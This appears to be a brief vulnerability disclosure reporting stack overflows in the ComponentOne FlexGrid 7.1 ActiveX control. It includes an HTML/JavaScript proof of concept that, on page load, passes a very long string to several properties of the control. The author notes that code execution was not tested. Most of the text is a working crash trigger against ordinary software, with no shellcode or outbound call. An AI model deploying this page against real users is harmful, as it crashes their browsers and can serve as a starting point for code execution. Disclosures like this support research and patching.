The ComponentOne FlexGrid 7.1 (VSFlexGrid.VSFlexGridL) has multiple stack overflows. I have not tested code execution nor do I remember what this component was installed with. PoC as follows:

--------------------
<!--

<html>
 <head>
  <script language="JavaScript" DEFER>
    function Check() {
     var s = "AAAA";

     while (s.length < 262145) s=s+s;
  
     var obj = new ActiveXObject("VSFlexGrid.VSFlexGridL");
     
     obj.Text = s;
     obj.EditSelText = s; 
     obj.EditText = s;
     obj.CellFontName = s;
   }
  </script>

 </head>  
 <body onload="JavaScript: return Check();" />
</html>
